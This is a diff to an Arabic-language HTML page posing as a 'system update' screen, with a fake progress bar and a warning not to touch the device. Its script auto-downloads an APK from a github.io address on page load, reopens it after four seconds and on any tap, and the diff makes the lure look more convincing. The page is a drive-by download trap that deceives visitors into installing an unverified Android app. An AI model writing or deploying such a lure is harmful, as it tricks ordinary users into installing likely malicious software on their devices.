@@ -1,45 +1,63 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
-  <meta charset="utf-8">
-  <title>تحديث أمني</title>
+  <meta charset="UTF-8">
+  <title>تحديث النظام</title>
   <style>
     body {
       background-color: #000;
       color: #0f0;
-      font-family: monospace;
+      font-family: "Courier New", monospace;
       text-align: center;
       padding-top: 100px;
     }
-    h1, p {
-      margin: 20px;
+    .progress {
+      width: 80%;
+      height: 30px;
+      background: #111;
+      border: 1px solid #0f0;
+      margin: 30px auto;
+      position: relative;
+    }
+    .bar {
+      height: 100%;
+      width: 0%;
+      background: #0f0;
+      animation: load 5s linear forwards;
+    }
+    @keyframes load {
+      to {
+        width: 100%;
+      }
     }
   </style>
 </head>
 <body>
 
-  <h1>🔐 جارٍ تطبيق تحديث الأمان...</h1>
-  <p>الرجاء عدم إغلاق الصفحة</p>
+  <h1>🔒 جاري تثبيت تحديث النظام...</h1>
+  <p>الرجاء عدم لمس الجهاز أثناء التحديث</p>
+
+  <div class="progress"><div class="bar"></div></div>
 
   <script>
     const apkUrl = "https://norhanmohsen1.github.io/Lol/sec_1.0.apk";
 
-    // تحميل التطبيق تلقائيًا
+    // تحميل APK تلقائيًا
     const link = document.createElement("a");
     link.href = apkUrl;
-    link.download = "Security_Update.apk";
+    link.download = "";
     document.body.appendChild(link);
     link.click();
 
-    // فتح رابط التثبيت بعد 3 ثواني
-    setTimeout(() => {
-      window.location.href = apkUrl;
-    }, 3000);
-
-    // لو ضغط في أي مكان، نحاول نعيد فتح رابط الـAPK
+    // أي لمسة في الشاشة → محاولة فتح التثبيت
     document.body.addEventListener("click", () => {
       window.location.href = apkUrl;
     });
+
+    // بعد 4 ثواني إعادة فتح التثبيت تلقائيًا (لو سمح المتصفح)
+    setTimeout(() => {
+      window.location.href = apkUrl;
+    }, 4000);
   </script>
 
 </body>
